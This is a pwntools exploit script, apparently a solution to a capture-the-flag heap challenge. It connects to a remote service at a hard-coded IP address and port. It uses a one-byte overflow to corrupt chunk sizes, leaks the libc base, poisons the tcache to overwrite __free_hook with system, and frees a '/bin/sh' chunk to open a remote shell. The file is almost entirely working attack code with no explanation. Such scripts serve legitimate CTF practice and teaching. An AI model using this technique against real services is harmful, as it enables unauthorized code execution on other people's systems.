#coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
local = 0
if local :
    a=process("./timu")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.198.29.45","32466")
    libc=ELF("./libc-2.27.so")

elf=ELF("./timu")
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000B5D)
    b *(0x555555554000+0x000000000000BBF)
    ''')
def menu(index):
    a.recvuntil("Your choice :\n")
    a.send(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("Size: \n")
    a.send(str(size))
    a.recvuntil("Data: \n")
    a.send(content)
def show(index):
    menu(3)
def delete(index):
    menu(2)
    a.recvuntil("Index: \n")
    a.send(str(index))

add(0x100-8,'A'+'\n')# 0
add(0x610-8,'A'*(0x610-0x20)+p64(0x600)+'\n')# 1
add(0x610-8,'A\n')# 2
add(0x10,'A\n') # 3

delete(0)
delete(1)
payload="/bin/sh\x00"
payload=payload.ljust(0x100-8,'A')
add(0x100-8,payload)# 0, 溢出修改chunk1 size。

add(0x420-8,'A\n')# 1
add(0x1e0-8,'A\n')# 4
delete(1)
delete(2)
add(0x420-8,'A\n')# 1
show(4)
a.recvuntil("4 : ")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-96-0x0000000003EBC40
success("libc_base ==> 0x%x"%libc_base)
add(0x100,'A\n')# 2
delete(2)
delete(4)
#debug()
add(0x100,p64(libc_base+libc.symbols["__free_hook"])+'\n')#2
add(0x100,p64(libc_base+libc.symbols["__free_hook"])+'\n')#4
add(0x100,p64(libc_base+libc.symbols["system"])+'\n')#5
delete(0)
a.interactive()


    